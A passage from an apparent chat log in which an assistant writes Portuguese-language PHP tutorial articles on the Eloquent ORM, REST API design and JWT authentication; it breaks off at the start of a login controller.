    public function itensDePedido(): HasManyThrough
    {
        return $this->hasManyThrough(
            PedidoItem::class, // modelo final
            Pedido::class,     // modelo intermediário
            'produto_id',      // FK de Pedido em Produto
            'pedido_id',       // FK de PedidoItem em Pedido
        );
    }
}

class Pedido extends Model
{
    protected $table    = 'pedidos';
    protected $fillable = ['usuario_id', 'total', 'status'];
    const CREATED_AT    = 'criado_em';
    const UPDATED_AT    = null;

    public function usuario(): BelongsTo
    {
        return $this->belongsTo(Usuario::class);
    }

    public function itens(): HasMany
    {
        return $this->hasMany(PedidoItem::class);
    }

    // Eager loading automático — sempre carrega estes relacionamentos
    protected $with = ['itens'];
}

// ── Uso dos relacionamentos ───────────────────────────────────────────

// Eager loading — evita N+1 queries
$pedidos = Pedido::with(['usuario', 'itens.produto', 'itens.produto.categoria'])
                 ->where('status', 'aprovado')
                 ->get();

foreach ($pedidos as $pedido) {
    echo $pedido->usuario->nome . "\n";      // sem query extra
    foreach ($pedido->itens as $item) {
        echo $item->produto->nome . "\n";    // sem query extra
        echo $item->produto->categoria->nome . "\n"; // sem query extra
    }
}

// Relacionamento muitos-para-muitos com pivot
$produto = Produto::find(1);
$produto->tags()->attach([1, 2, 3]);         // adiciona tags
$produto->tags()->detach(2);                  // remove tag 2
$produto->tags()->sync([1, 4, 5]);           // substitui todas as tags
```

---

## Escopos — queries reutilizáveis

Escopos encapsulam condições de query frequentes para que possam ser reutilizadas em qualquer lugar com uma chamada de método.

```php
<?php
declare(strict_types=1);

use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Model;

class Produto extends Model
{
    // ── Escopo global — aplica automaticamente em TODAS as queries ────
    // Aqui: sempre filtra por empresa_id do usuário logado (multitenancy)
    protected static function booted(): void
    {
        static::addGlobalScope('empresa', function (Builder $query) {
            if ($empresaId = auth()?->user()?->empresa_id) {
                $query->where('empresa_id', $empresaId);
            }
        });
    }

    // ── Escopos locais — ativados manualmente por nome ─────────────────
    // Convenção: método scopeXxx() → chamado como ::xxx()

    public function scopeAtivo(Builder $query): Builder
    {
        return $query->where('ativo', true);
    }

    public function scopeEmEstoque(Builder $query): Builder
    {
        return $query->where('estoque', '>', 0);
    }

    public function scopeNaCategoria(Builder $query, string $slug): Builder
    {
        return $query->whereHas('categoria', fn($q) => $q->where('slug', $slug));
    }

    public function scopeNaFaixaDePreco(Builder $query, float $min, float $max): Builder
    {
        return $query->whereBetween('preco', [$min, $max]);
    }

    public function scopeOrdenado(Builder $query, string $col = 'nome', string $dir = 'asc'): Builder
    {
        return $query->orderBy($col, $dir);
    }
}

// ── Encadeando escopos locais — legível como prosa ────────────────────
$produtos = Produto::ativo()
                   ->emEstoque()
                   ->naCategoria('eletronicos')
                   ->naFaixaDePreco(100, 2000)
                   ->ordenado('preco', 'asc')
                   ->paginate(20);

// Desabilitando escopo global pontualmente
$todosSemFiltroDeEmpresa = Produto::withoutGlobalScope('empresa')->get();
```

---

## Eventos e Observers

Eloquent dispara eventos em pontos específicos do ciclo de vida de um modelo: `creating`, `created`, `updating`, `updated`, `saving`, `saved`, `deleting`, `deleted`. Observers agrupam handlers desses eventos em uma classe dedicada.

```php
<?php
declare(strict_types=1);

use Illuminate\Database\Eloquent\Model;

// ── Observer — agrupa todos os handlers de eventos de um modelo ───────
class PedidoObserver
{
    // Antes de criar — pode cancelar a operação retornando false
    public function creating(Pedido $pedido): void
    {
        // Gera número de pedido único antes de persistir
        $pedido->numero = 'PED-' . strtoupper(uniqid());
    }

    // Após criar
    public function created(Pedido $pedido): void
    {
        // Notifica o time via fila (sem bloquear a requisição)
        // NotificarNovoPedidoJob::dispatch($pedido->id);
        \Log::info("Novo pedido #{$pedido->numero} criado", ['id' => $pedido->id]);
    }

    // Após atualizar — reage a mudanças de status
    public function updated(Pedido $pedido): void
    {
        if ($pedido->wasChanged('status')) {
            $anterior = $pedido->getOriginal('status');
            $novo     = $pedido->status;
            \Log::info("Pedido #{$pedido->numero}: {$anterior} → {$novo}");

            // Dispara ação específica por status
            match ($novo) {
                'aprovado'  => $this->aoAprovar($pedido),
                'cancelado' => $this->aoCancelar($pedido),
                default     => null,
            };
        }
    }

    // Antes de deletar — valida se pode ser excluído
    public function deleting(Pedido $pedido): bool
    {
        if ($pedido->status === 'entregue') {
            throw new \RuntimeException(
                "Pedidos entregues não podem ser excluídos: #{$pedido->numero}"
            );
        }
        return true;
    }

    private function aoAprovar(Pedido $pedido): void
    {
        // EnviarEmailConfirmacaoJob::dispatch($pedido);
    }

    private function aoCancelar(Pedido $pedido): void
    {
        // Restaura estoque dos itens cancelados
        foreach ($pedido->itens as $item) {
            $item->produto->increment('estoque', $item->quantidade);
        }
    }
}

// ── Registrar o observer — normalmente em AppServiceProvider ──────────
Pedido::observe(PedidoObserver::class);

// Agora todas as operações em Pedido disparam o observer automaticamente
$pedido = Pedido::create([
    'usuario_id' => 1,
    'total'      => 350.00,
    'status'     => 'pendente',
]);
// creating → número gerado automaticamente
// created  → log registrado

$pedido->update(['status' => 'aprovado']);
// updated → log + email de confirmação
```

---

## Resumo do artigo

| Conceito | O que aprendemos |
|---|---|
| Configuração | Eloquent standalone via `illuminate/database` — sem Laravel |
| `$fillable` / `$hidden` | Controla quais colunas podem ser preenchidas/expostas |
| `$casts` | Tipagem automática — `boolean`, `datetime`, Enum PHP 8.1 |
| Accessors / Mutators | Transformam valores ao ler ou gravar — via `Attribute::make()` |
| `hasMany` / `belongsTo` | Relacionamentos 1:N — FK configurável |
| `belongsToMany` | Muitos para muitos com tabela pivot |
| Eager Loading | `with(['rel.subrel'])` — elimina o problema N+1 |
| Escopo global | Aplica filtro em todas as queries do modelo automaticamente |
| Escopo local | `scopeXxx()` → chamado como `::xxx()` — queries reutilizáveis |
| Observer | Agrupa handlers de eventos do ciclo de vida do modelo |

---

## Exercício da semana

1. Crie o modelo `Produto` com os casts corretos para `preco` (decimal), `ativo` (boolean) e `criado_em` (datetime). Adicione um accessor `precoFormatado` que retorna `"R$ 1.350,00"` e um mutator que normaliza o nome do produto (trim + ucwords) antes de salvar.

2. Implemente os relacionamentos: `Produto` pertence a `Categoria`; `Categoria` tem muitos `Produto`; `Produto` tem muitos `Tag` (muitos-para-muitos com tabela `produto_tags`). Demonstre eager loading com `with(['categoria', 'tags'])`.

3. Adicione ao modelo `Produto` os escopos locais: `ativo()`, `emEstoque()`, `naFaixaDePreco(float $min, float $max)` e `mais Vendidos(int $limite)` (que usa subquery contando `pedido_itens`). Encadeie todos numa única query.

4. Crie um `UsuarioObserver` com handlers para: `creating` (gera UUID v4 e armazena em `uuid`), `created` (registra log), `updated` (notifica se email mudou) e `deleting` (bloqueia exclusão de admins). Registre e teste todos os eventos.

5. **Desafio:** implemente um escopo global `EmpresaScope` que filtra todos os modelos por `empresa_id` da sessão. Crie uma trait `PertenceAEmpresa` que adiciona o escopo automaticamente via `booted()`. Aplique a trait em `Produto`, `Pedido` e `Usuario`, e demonstre como desabilitá-lo pontualmente com `withoutGlobalScope()`.

---

## Referências

- Eloquent ORM — Documentação oficial: https://laravel.com/docs/eloquent
- Eloquent Relationships: https://laravel.com/docs/eloquent-relationships
- Eloquent Mutators & Casting: https://laravel.com/docs/eloquent-mutators
- Eloquent Events: https://laravel.com/docs/eloquent#events
- illuminate/database standalone: https://github.com/illuminate/database

---

Texto do Artigo 22 completo. Gerando o HTML.

Artigos 21 e 22 entregues. Progresso: **22/52 artigos completos**.

Módulo 4 (Banco de Dados) encerrado com 3 artigos sólidos — PDO, Query Builder/Migrations e Eloquent. Próximo: **Artigo 23 — Módulo 5: APIs REST com PHP**. Continuo?

---

# you asked

message time: 2026-03-08 23:56:24

Continue

---

# claude response

# Artigo 23 — APIs REST com PHP

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 23 · Módulo 5: APIs REST

---

## Introdução

REST (Representational State Transfer) é o estilo arquitetural dominante para APIs web. Uma API REST expõe recursos via URLs, usa os verbos HTTP (GET, POST, PUT, PATCH, DELETE) de acordo com a semântica da operação, retorna respostas em JSON com os códigos de status corretos, e é stateless — cada requisição carrega todas as informações necessárias para ser processada.

Construir APIs REST em PHP puro (sem framework) é o melhor exercício para entender o que frameworks fazem por baixo dos panos. Neste artigo construímos um mini-framework de roteamento, um sistema de resposta JSON padronizado, tratamento de erros estruturado, e aplicamos boas práticas de design de API que se traduzem diretamente para qualquer framework que você usar depois.

---

## Estrutura de uma requisição HTTP

Antes de escrever código, é essencial entender como o PHP expõe uma requisição HTTP:

```php
<?php
declare(strict_types=1);

// ── Método HTTP ────────────────────────────────────────────────────────
$metodo = $_SERVER['REQUEST_METHOD'];           // GET, POST, PUT, PATCH, DELETE

// ── URI e query string ─────────────────────────────────────────────────
$uri    = $_SERVER['REQUEST_URI'];              // /api/produtos?pagina=2&limite=20
$path   = parse_url($uri, PHP_URL_PATH);        // /api/produtos
parse_str($_SERVER['QUERY_STRING'] ?? '', $query); // ['pagina' => '2', 'limite' => '20']

// ── Headers ────────────────────────────────────────────────────────────
$contentType = $_SERVER['CONTENT_TYPE']         ?? '';
$accept      = $_SERVER['HTTP_ACCEPT']          ?? '';
$authHeader  = $_SERVER['HTTP_AUTHORIZATION']   ?? '';

// ── Corpo da requisição ────────────────────────────────────────────────
// Para POST com Content-Type: application/x-www-form-urlencoded → $_POST
// Para PUT, PATCH, DELETE e JSON → ler php://input
$corpoRaw = file_get_contents('php://input');
$corpo    = json_decode($corpoRaw, associative: true) ?? [];

// json_last_error() verifica se o JSON era válido
if ($corpoRaw !== '' && json_last_error() !== JSON_ERROR_NONE) {
    // Corpo inválido — retornar 400 Bad Request
}
```

---

## Sistema de resposta JSON padronizado

Toda API precisa de um formato de resposta consistente. Um envelope padrão facilita o consumo pelo cliente e o debugging.

```php
<?php
declare(strict_types=1);

class Resposta
{
    private function __construct() {}

    // ── Respostas de sucesso ──────────────────────────────────────────

    public static function ok(mixed $dados = null, string $mensagem = ''): never
    {
        self::enviar(200, ['sucesso' => true, 'dados' => $dados, 'mensagem' => $mensagem]);
    }

    public static function criado(mixed $dados = null, string $mensagem = 'Recurso criado.'): never
    {
        self::enviar(201, ['sucesso' => true, 'dados' => $dados, 'mensagem' => $mensagem]);
    }

    public static function semConteudo(): never
    {
        http_response_code(204);
        exit;
    }

    // ── Respostas de erro ─────────────────────────────────────────────

    public static function erro(
        int    $codigo,
        string $mensagem,
        array  $detalhes = [],
    ): never {
        self::enviar($codigo, [
            'sucesso'  => false,
            'erro'     => [
                'codigo'   => $codigo,
                'mensagem' => $mensagem,
                'detalhes' => $detalhes ?: null,
            ],
        ]);
    }

    public static function badRequest(string $mensagem = 'Requisição inválida.', array $detalhes = []): never
    {
        self::erro(400, $mensagem, $detalhes);
    }

    public static function naoAutorizado(string $mensagem = 'Autenticação necessária.'): never
    {
        self::erro(401, $mensagem);
    }

    public static function proibido(string $mensagem = 'Acesso negado.'): never
    {
        self::erro(403, $mensagem);
    }

    public static function naoEncontrado(string $mensagem = 'Recurso não encontrado.'): never
    {
        self::erro(404, $mensagem);
    }

    public static function erroInterno(string $mensagem = 'Erro interno do servidor.'): never
    {
        self::erro(500, $mensagem);
    }

    // ── Resposta paginada ─────────────────────────────────────────────

    public static function paginado(
        array $itens,
        int   $total,
        int   $pagina,
        int   $porPagina,
    ): never {
        $totalPaginas = (int) ceil($total / $porPagina);
        self::enviar(200, [
            'sucesso' => true,
            'dados'   => $itens,
            'paginacao' => [
                'total'        => $total,
                'por_pagina'   => $porPagina,
                'pagina_atual' => $pagina,
                'total_paginas'=> $totalPaginas,
                'tem_proxima'  => $pagina < $totalPaginas,
                'tem_anterior' => $pagina > 1,
            ],
        ]);
    }

    private static function enviar(int $codigo, array $corpo): never
    {
        http_response_code($codigo);
        header('Content-Type: application/json; charset=utf-8');
        header('X-Content-Type-Options: nosniff');
        echo json_encode($corpo, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        exit;
    }
}
```

---

## Router — roteamento com parâmetros dinâmicos

```php
<?php
declare(strict_types=1);

class Router
{
    private array $rotas = [];

    public function get(string $padrao, callable $handler): void
    {
        $this->registrar('GET', $padrao, $handler);
    }

    public function post(string $padrao, callable $handler): void
    {
        $this->registrar('POST', $padrao, $handler);
    }

    public function put(string $padrao, callable $handler): void
    {
        $this->registrar('PUT', $padrao, $handler);
    }

    public function patch(string $padrao, callable $handler): void
    {
        $this->registrar('PATCH', $padrao, $handler);
    }

    public function delete(string $padrao, callable $handler): void
    {
        $this->registrar('DELETE', $padrao, $handler);
    }

    private function registrar(string $metodo, string $padrao, callable $handler): void
    {
        // Converte /produtos/{id} → regex /produtos/(?P<id>[^/]+)
        $regex = preg_replace('/\{(\w+)\}/', '(?P<$1>[^/]+)', $padrao);
        $this->rotas[] = [
            'metodo'  => $metodo,
            'padrao'  => "#^{$regex}$#",
            'handler' => $handler,
        ];
    }

    public function despachar(string $metodo, string $uri): void
    {
        $path = parse_url($uri, PHP_URL_PATH);

        foreach ($this->rotas as $rota) {
            if ($rota['metodo'] !== $metodo) continue;

            if (preg_match($rota['padrao'], $path, $matches)) {
                // Extrai apenas parâmetros nomeados (filtra índices numéricos)
                $params = array_filter(
                    $matches,
                    fn($k) => is_string($k),
                    ARRAY_FILTER_USE_KEY
                );
                // Tipagem automática de IDs numéricos
                $params = array_map(
                    fn($v) => is_numeric($v) ? (int) $v : $v,
                    $params
                );
                ($rota['handler'])($params);
                return;
            }
        }

        Resposta::naoEncontrado("Rota não encontrada: {$metodo} {$path}");
    }
}
```

---

## Controllers — organizando os handlers

```php
<?php
declare(strict_types=1);

class ProdutoController
{
    public function __construct(
        private readonly ProdutoRepositorioInterface $repositorio,
    ) {}

    // GET /api/produtos
    public function listar(array $params): void
    {
        $pagina    = max(1, (int) ($_GET['pagina']   ?? 1));
        $porPagina = min(100, max(1, (int) ($_GET['limite'] ?? 20)));
        $categoria = $_GET['categoria'] ?? null;

        $resultado = $this->repositorio->buscarPaginado(
            pagina:    $pagina,
            porPagina: $porPagina,
            categoria: $categoria,
        );

        Resposta::paginado(
            itens:     array_map($this->serializar(...), $resultado['itens']),
            total:     $resultado['total'],
            pagina:    $pagina,
            porPagina: $porPagina,
        );
    }

    // GET /api/produtos/{id}
    public function mostrar(array $params): void
    {
        $produto = $this->repositorio->buscarPorId($params['id']);

        if ($produto === null) {
            Resposta::naoEncontrado("Produto #{$params['id']} não encontrado.");
        }

        Resposta::ok($this->serializar($produto));
    }

    // POST /api/produtos
    public function criar(array $params): void
    {
        $corpo = $this->lerCorpo();
        $erros = $this->validarCriacao($corpo);

        if (!empty($erros)) {
            Resposta::badRequest('Dados inválidos.', $erros);
        }

        $produto = $this->repositorio->salvar(new Produto(
            id:      0,
            nome:    trim($corpo['nome']),
            preco:   (float) $corpo['preco'],
            estoque: (int)   ($corpo['estoque'] ?? 0),
            ativo:   (bool)  ($corpo['ativo']   ?? true),
        ));

        Resposta::criado($this->serializar($produto), "Produto criado com sucesso.");
    }

    // PUT /api/produtos/{id}
    public function atualizar(array $params): void
    {
        $produto = $this->repositorio->buscarPorId($params['id']);
        if ($produto === null) Resposta::naoEncontrado();

        $corpo = $this->lerCorpo();
        $erros = $this->validarCriacao($corpo);
        if (!empty($erros)) Resposta::badRequest('Dados inválidos.', $erros);

        $atualizado = new Produto(
            id:      $produto->id,
            nome:    trim($corpo['nome']),
            preco:   (float) $corpo['preco'],
            estoque: (int)   ($corpo['estoque'] ?? $produto->estoque),
            ativo:   (bool)  ($corpo['ativo']   ?? $produto->ativo),
        );

        Resposta::ok($this->serializar($this->repositorio->salvar($atualizado)));
    }

    // PATCH /api/produtos/{id}
    public function atualizarParcial(array $params): void
    {
        $produto = $this->repositorio->buscarPorId($params['id']);
        if ($produto === null) Resposta::naoEncontrado();

        $corpo = $this->lerCorpo();

        // PATCH só atualiza os campos fornecidos — mantém o resto
        $atualizado = new Produto(
            id:      $produto->id,
            nome:    isset($corpo['nome'])    ? trim($corpo['nome'])    : $produto->nome,
            preco:   isset($corpo['preco'])   ? (float) $corpo['preco'] : $produto->preco,
            estoque: isset($corpo['estoque']) ? (int) $corpo['estoque'] : $produto->estoque,
            ativo:   isset($corpo['ativo'])   ? (bool) $corpo['ativo']  : $produto->ativo,
        );

        Resposta::ok($this->serializar($this->repositorio->salvar($atualizado)));
    }

    // DELETE /api/produtos/{id}
    public function deletar(array $params): void
    {
        $produto = $this->repositorio->buscarPorId($params['id']);
        if ($produto === null) Resposta::naoEncontrado();

        $this->repositorio->deletar($params['id']);
        Resposta::semConteudo();
    }

    // ── Helpers privados ─────────────────────────────────────────────

    private function lerCorpo(): array
    {
        $raw = file_get_contents('php://input');
        if (empty($raw)) return [];

        $dados = json_decode($raw, associative: true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            Resposta::badRequest('JSON inválido: ' . json_last_error_msg());
        }
        return $dados ?? [];
    }

    private function validarCriacao(array $dados): array
    {
        $erros = [];
        if (empty($dados['nome'])) {
            $erros['nome'] = 'O nome é obrigatório.';
        } elseif (strlen($dados['nome']) > 200) {
            $erros['nome'] = 'O nome deve ter no máximo 200 caracteres.';
        }
        if (!isset($dados['preco']) || !is_numeric($dados['preco']) || $dados['preco'] < 0) {
            $erros['preco'] = 'O preço deve ser um número positivo.';
        }
        return $erros;
    }

    private function serializar(Produto $p): array
    {
        return [
            'id'       => $p->id,
            'nome'     => $p->nome,
            'preco'    => $p->preco,
            'estoque'  => $p->estoque,
            'ativo'    => $p->ativo,
        ];
    }
}
```

---

## Tratamento global de erros e ponto de entrada

```php
<?php
declare(strict_types=1);

// public/index.php — ponto de entrada único

require_once __DIR__ . '/../vendor/autoload.php';

// Headers CORS para APIs consumidas por outros domínios
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

// Preflight CORS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

// Handler global de exceções não capturadas
set_exception_handler(function (\Throwable $e) {
    $isDev = getenv('APP_ENV') === 'development';

    error_log($e->getMessage() . ' in ' . $e->getFile() . ':' . $e->getLine());

    Resposta::erroInterno(
        $isDev ? $e->getMessage() : 'Erro interno do servidor.'
    );
});

// Handler de erros PHP como exceções
set_error_handler(function (int $severity, string $msg, string $file, int $line): bool {
    if (!(error_reporting() & $severity)) return false;
    throw new \ErrorException($msg, 0, $severity, $file, $line);
});

// Conexão e dependências
$pdo        = criarConexao(/* ... */);
$repositorio = new ProdutoRepositorioPDO($pdo);
$controller  = new ProdutoController($repositorio);

// Definição das rotas
$router = new Router();

$router->get   ('/api/produtos',      [$controller, 'listar']);
$router->get   ('/api/produtos/{id}', [$controller, 'mostrar']);
$router->post  ('/api/produtos',      [$controller, 'criar']);
$router->put   ('/api/produtos/{id}', [$controller, 'atualizar']);
$router->patch ('/api/produtos/{id}', [$controller, 'atualizarParcial']);
$router->delete('/api/produtos/{id}', [$controller, 'deletar']);

// Despacha a requisição
$router->despachar(
    $_SERVER['REQUEST_METHOD'],
    $_SERVER['REQUEST_URI'],
);
```

---

## Boas práticas de design de API REST

```
# Nomes de recursos sempre no plural e em substantivos
GET  /api/produtos          ✅   GET  /api/buscarProdutos    ❌
GET  /api/produtos/42       ✅   GET  /api/getProduto/42     ❌
POST /api/produtos          ✅   POST /api/criarProduto      ❌

# Relacionamentos como sub-recursos
GET  /api/pedidos/7/itens       # itens do pedido 7
GET  /api/usuarios/3/pedidos    # pedidos do usuário 3

# Ações que não mapeiam para CRUD usam verbos como sufixo
POST /api/pedidos/7/cancelar    # cancelar pedido 7
POST /api/usuarios/3/ativar     # ativar usuário 3

# Versionamento na URL — protege clientes existentes
GET  /api/v1/produtos
GET  /api/v2/produtos           # nova versão com breaking changes

# Filtros, ordenação e paginação via query string
GET  /api/produtos?categoria=eletronicos&preco_min=100&preco_max=2000
GET  /api/produtos?ordenar=preco&direcao=asc
GET  /api/produtos?pagina=2&limite=20

# Códigos de status HTTP corretos — não retornar 200 para tudo
200 OK              → GET bem-sucedido, UPDATE bem-sucedido
201 Created         → POST que criou um recurso
204 No Content      → DELETE bem-sucedido, sem corpo de resposta
400 Bad Request     → dados inválidos, JSON malformado
401 Unauthorized    → sem autenticação
403 Forbidden       → autenticado mas sem permissão
404 Not Found       → recurso não existe
409 Conflict        → conflito de estado (email duplicado)
422 Unprocessable   → validação falhou (alternativa ao 400)
500 Internal Error  → erro não tratado no servidor
```

---

## Resumo do artigo

| Conceito | O que aprendemos |
|---|---|
| Estrutura HTTP | `$_SERVER`, `php://input`, `parse_url()`, `json_decode()` |
| Resposta padronizada | Envelope JSON com `sucesso`, `dados`, `erro`, `paginacao` |
| Router | Converte `{param}` em regex, extrai parâmetros nomeados |
| Controllers | Separa lógica de rota da lógica de negócio |
| PUT vs PATCH | PUT substitui o recurso completo; PATCH atualiza campos específicos |
| CORS | Headers `Access-Control-Allow-*` + tratamento de preflight OPTIONS |
| Tratamento de erros | `set_exception_handler()` + `set_error_handler()` globais |
| Boas práticas REST | Nomes plurais, verbos HTTP corretos, status HTTP semânticos |

---

## Exercício da semana

1. Estenda o `Router` para suportar middlewares: método `middleware(callable ...$mws)` que envolve o handler — cada middleware recebe `($params, $proximo)` e pode chamar `$proximo($params)` para continuar ou retornar uma resposta de erro.

2. Implemente um `UsuarioController` completo com as rotas: `GET /api/usuarios`, `GET /api/usuarios/{id}`, `POST /api/usuarios`, `PUT /api/usuarios/{id}`, `DELETE /api/usuarios/{id}`. Inclua validação de email único no POST.

3. Adicione suporte a sub-recursos: `GET /api/usuarios/{id}/pedidos` que retorna os pedidos de um usuário específico, com paginação. O controller deve verificar se o usuário existe antes de buscar os pedidos.

4. Implemente rate limiting simples: use APCu ou um arquivo JSON para registrar o número de requisições por IP na última hora. Se ultrapassar 100 requisições, retornar `429 Too Many Requests` com header `Retry-After`.

5. **Desafio:** crie um sistema de versionamento de API: rotas registradas como `/api/v1/produtos` e `/api/v2/produtos` podem coexistir, com controllers diferentes. Implemente uma classe `ApiVersion` que lê o prefixo de versão da URL e instancia o controller correto via array de mapeamento.

---

## Referências

- MDN — HTTP Methods: https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Methods
- MDN — HTTP Status Codes: https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Status
- REST API Design Best Practices — Fielding dissertation: https://ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm
- PHP Manual — php://input: https://www.php.net/manual/pt_BR/wrappers.php.php
- JSON:API specification: https://jsonapi.org

---

Texto do Artigo 23 completo. Gerando o HTML.

---

# claude response

# Artigo 24 — Autenticação JWT

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 24 · Módulo 5: APIs REST

---

## Introdução

Autenticação é o processo de verificar quem é o cliente. Em APIs REST stateless, não existe sessão no servidor — cada requisição deve provar sua identidade. JWT (JSON Web Token) é o padrão dominante para isso: um token autocontido que carrega claims (afirmações sobre o usuário), assinado criptograficamente para que o servidor possa verificar sua autenticidade sem consultar o banco de dados.

Um JWT tem três partes separadas por pontos: o header (algoritmo), o payload (dados) e a assinatura. O servidor assina o token com uma chave secreta na emissão; na verificação, recalcula a assinatura e compara — se bater, o token é válido. Se qualquer bit do payload for alterado, a assinatura não bate e o token é rejeitado.

Neste artigo implementamos JWT do zero para entender o mecanismo, depois usamos a biblioteca `firebase/php-jwt` para produção, construímos refresh tokens, e criamos um middleware de autenticação reutilizável.

---

## Anatomia de um JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← Header  (base64url)
.
eyJzdWIiOiI0MiIsIm5hbWUiOiJBbmEiLCJpYXQiOjE3MDAwMDAwMDB9  ← Payload (base64url)
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   ← Assinatura (HMAC-SHA256)
```

```php
<?php
declare(strict_types=1);

// ── Decodificando manualmente para entender a estrutura ───────────────

$token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
       . '.eyJzdWIiOiI0MiIsIm5hbWUiOiJBbmEiLCJpYXQiOjE3MDAwMDAwMDB9'
       . '.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';

[$headerB64, $payloadB64, $assinaturaB64] = explode('.', $token);

// base64url → base64 padrão → decodificar
function base64urlDecode(string $input): string
{
    $b64 = strtr($input, '-_', '+/');
    $b64 = str_pad($b64, strlen($b64) + (4 - strlen($b64) % 4) % 4, '=');
    return base64_decode($b64);
}

$header    = json_decode(base64urlDecode($headerB64),    associative: true);
$payload   = json_decode(base64urlDecode($payloadB64),   associative: true);

// $header  = ['alg' => 'HS256', 'typ' => 'JWT']
// $payload = ['sub' => '42', 'name' => 'Ana', 'iat' => 1700000000]

// ── Claims padrão do JWT ──────────────────────────────────────────────
// iss (issuer)    — quem emitiu o token
// sub (subject)   — a quem o token se refere (geralmente o ID do usuário)
// aud (audience)  — para quem o token é destinado
// exp (expiration)— timestamp Unix de expiração — SEMPRE definir
// iat (issued at) — timestamp Unix de emissão
// jti (JWT ID)    — ID único do token — útil para revogação
```

---

## Implementação JWT do zero (para entender)

```php
<?php
declare(strict_types=1);

class JwtManual
{
    public static function assinar(array $payload, string $chave): string
    {
        $header = ['alg' => 'HS256', 'typ' => 'JWT'];

        $headerB64  = self::base64urlEncode(json_encode($header));
        $payloadB64 = self::base64urlEncode(json_encode($payload));

        $mensagem   = "{$headerB64}.{$payloadB64}";
        $assinatura = hash_hmac('sha256', $mensagem, $chave, binary: true);

        return "{$mensagem}." . self::base64urlEncode($assinatura);
    }

    public static function verificar(string $token, string $chave): array
    {
        $partes = explode('.', $token);
        if (count($partes) !== 3) {
            throw new \InvalidArgumentException('Token JWT malformado.');
        }

        [$headerB64, $payloadB64, $assinaturaB64] = $partes;

        // Recalcula a assinatura esperada
        $mensagem            = "{$headerB64}.{$payloadB64}";
        $assinaturaEsperada  = hash_hmac('sha256', $mensagem, $chave, binary: true);
        $assinaturaRecebida  = self::base64urlDecode($assinaturaB64);

        // Comparação segura — evita timing attacks
        if (!hash_equals($assinaturaEsperada, $assinaturaRecebida)) {
            throw new \RuntimeException('Assinatura JWT inválida.');
        }

        $payload = json_decode(self::base64urlDecode($payloadB64), associative: true);

        // Verifica expiração
        if (isset($payload['exp']) && $payload['exp'] < time()) {
            throw new \RuntimeException('Token JWT expirado.');
        }

        return $payload;
    }

    private static function base64urlEncode(string $input): string
    {
        return rtrim(strtr(base64_encode($input), '+/', '-_'), '=');
    }

    private static function base64urlDecode(string $input): string
    {
        $b64 = strtr($input, '-_', '+/');
        $b64 = str_pad($b64, strlen($b64) + (4 - strlen($b64) % 4) % 4, '=');
        return base64_decode($b64);
    }
}

// Teste
$payload = ['sub' => '42', 'nome' => 'Ana', 'exp' => time() + 3600, 'iat' => time()];
$token   = JwtManual::assinar($payload, 'minha-chave-secreta');
$dados   = JwtManual::verificar($token, 'minha-chave-secreta'); // retorna $payload
```

---

## JWT com firebase/php-jwt (produção)

Para produção, usamos a biblioteca `firebase/php-jwt` que implementa todos os algoritmos e edge cases corretamente.

```php
<?php
declare(strict_types=1);

// composer require firebase/php-jwt

use Firebase\JWT\JWT;
use Firebase\JWT\Key;
use Firebase\JWT\ExpiredException;
use Firebase\JWT\SignatureInvalidException;
use Firebase\JWT\BeforeValidException;

class ServicoJWT
{
    // Usar RS256 (RSA) em produção é mais seguro que HS256 (HMAC)
    // porque a chave de verificação (pública) pode ser compartilhada sem expor a chave de assinatura
    // Para simplicidade, usamos HS256 aqui
    private const ALGORITMO = 'HS256';
    private const TTL_ACCESS  = 900;     // 15 minutos — token de acesso curto
    private const TTL_REFRESH = 604800;  // 7 dias — refresh token longo

    public function __construct(
        private readonly string $chaveSecreta, // mínimo 32 caracteres, variável de ambiente
        private readonly string $issuer = 'meuapp.com.br',
    ) {}

    public function emitirTokenDeAcesso(int $usuarioId, string $perfil, string $email): string
    {
        $agora = time();
        $payload = [
            'iss'    => $this->issuer,
            'sub'    => (string) $usuarioId,
            'iat'    => $agora,
            'exp'    => $agora + self::TTL_ACCESS,
            'perfil' => $perfil,
            'email'  => $email,
            'tipo'   => 'access',
        ];
        return JWT::encode($payload, $this->chaveSecreta, self::ALGORITMO);
    }

    public function emitirRefreshToken(int $usuarioId): string
    {
        $agora = time();
        $payload = [
            'iss'  => $this->issuer,
            'sub'  => (string) $usuarioId,
            'iat'  => $agora,
            'exp'  => $agora + self::TTL_REFRESH,
            'jti'  => bin2hex(random_bytes(16)), // ID único para revogação
            'tipo' => 'refresh',
        ];
        return JWT::encode($payload, $this->chaveSecreta, self::ALGORITMO);
    }

    public function verificar(string $token): object
    {
        return JWT::decode($token, new Key($this->chaveSecreta, self::ALGORITMO));
    }

    public function verificarComTratamento(string $token): array
    {
        try {
            $payload = $this->verificar($token);
            return ['valido' => true, 'payload' => $payload, 'erro' => null];
        } catch (ExpiredException $e) {
            return ['valido' => false, 'payload' => null, 'erro' => 'token_expirado'];
        } catch (SignatureInvalidException $e) {
            return ['valido' => false, 'payload' => null, 'erro' => 'assinatura_invalida'];
        } catch (BeforeValidException $e) {
            return ['valido' => false, 'payload' => null, 'erro' => 'token_ainda_nao_valido'];
        } catch (\Exception $e) {
            return ['valido' => false, 'payload' => null, 'erro' => 'token_invalido'];
        }
    }
}
```

---

## Controller de autenticação — login, refresh e logout

```php
<?php
declare(strict_types=1);

class AuthController
{
    public function __construct(
        private readonly ServicoJWT           $jwt,
        private readonly UsuarioRepositorioInterface $usuarios,
        private readonly RefreshTokenRepositorio     $refreshTokens,
    ) {}

    // POST /api/auth/login
